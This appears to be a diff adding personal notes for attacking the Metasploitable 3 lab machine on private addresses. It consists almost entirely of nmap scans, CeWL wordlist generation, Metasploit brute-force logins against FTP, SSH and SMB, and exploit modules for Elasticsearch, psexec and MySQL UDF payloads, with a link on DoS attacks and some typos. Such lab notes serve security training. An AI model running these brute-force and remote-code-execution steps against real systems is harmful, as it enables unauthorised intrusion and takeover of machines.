@@ -1,0 +1,136 @@
+nmap –p- -sV 192.168.1.8
+
+# Note: CeWL is a command used to make a customized wordlist using a given URL.
+
+FTP 21:
+cewl https://github.com/rapid/metasploitable3/wiki -m 7 -d 0 –w /root/Desktop/dict.txt
+use auxiliary/scanner/ftp/ftp_login
+
+msf exploit (ftp_login)>set username vagrant
+
+msf exploit (ftp_login)>set rhosts 192.168.1.8
+
+msf exploit (ftp_login)>set pass_file /root/Desktop/pass.txt
+
+msf exploit (ftp_login)>set stop_on_success true
+
+msf exploit (ftp_login)> exploit
+
+-----------------------------------------------------------------------
+Elasticsearch Exploit 9200 :
+# Nmap shows a splendid result and in that result you can see that HHTP service going on 9200 which is using elasticseatch REST. Let’s search it exploit on google.
+use exploit/multi/elasticsearch/script_mvel_rce
+
+msf exploit (script_mvel_rce)>set rhost 192.168.1.8
+
+msf exploit (script_mvel_rce)>set rport 9200
+
+msf exploit (script_mvel_rce)>exploit
+
+-------------------------------------------------------------------------
+Exploitation using Brute forcing SSH 22:
+
+cewl https://github.com/rapid/metasploitable3/wiki -m 7 -d 0 –w /root/Desktop/dict.txt
+use auxiliary/scanner/ssh/ssh_login
+
+msf auxiliary(ssh_login)>set rhosts 192.168.1.8
+
+msf auxiliary (ssh_login)>set port 22
+
+msf auxiliary (ssh_login)>set username vagrant
+
+msf auxiliary(ssh_login)>set pass_file /root/Desktop/pass.txt
+
+msf auxiliary(ssh_login)>set stop_on_success true
+
+msf auxiliary (ssh_login)> exploit
+-------------------------------------------------------------------------------------
+SMB Service Exploitation 445
+
+cewl https://github.com/rapid/metasploitable3/wiki -m 7 -d 0 –w /root/Desktop/pass.txt
+
+# First to get credential
+use auxiliary/scanner/smb/smb_login
+
+msf auxiliary (smb_login)>set rhosts 192.168.1.11
+
+msf auxiliary (smb_login)>set rport 445
+
+msf auxiliary (smb_login)>set smbuser vagrant
+
+msf auxiliary (smb_login)>set pass_file /root/Desktop/pass.txt
+
+msf auxiliary (smb_login)>set stop_on_success true
+
+msf auxiliary (smb_login)> exploit
+
+#Now for Attack
+
+msf> use exploit/windows/smb/psexec
+
+msf exploit (psexec)>set rhosts 192.168.1.11
+
+msf exploit (psexec)>set rport 445
+
+msf exploit (psexec)>set smbuser vagrant
+
+msf exploit (psexec)>set smbpass vargrant
+
+msf exploit (psexec)> exploit
+----------------------------------------------------------------------------------
+
+Mysql Service Exploitation 3306
+
+# Let’s penetrate more inside it, use NESSUS for vulnerability analysis
+# This module creates and enables a custom UDF (user defined function) on the target host via the SELECT … into DUMPFILE method of binary injection. 
+On default Microsoft Windows installations of MySQL (=<5.5.9), directory write permissions not enforced, and the MySQL service runs as LocalSystem. 
+NOTE: This module will leave a payload executable on the target system when the attack is finished, as well as the UDF DLL, and will define or redefine sys_eval() and sys_exec() functions.
+
+msf > use exploit/windows/mysql/mysql_payload
+
+msf exploit(mysql_payload) > set rhost 192.168.0.103
+
+msf exploit(mysql_payload) > set rport 3306
+
+msf exploit(mysql_payload) > exploit
+---------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+ DOS Attack:
+https://www.hackingarticles.in/perform-dos-attack-metasploitable-3/
+nmap -p-  -A 192.168.1.14
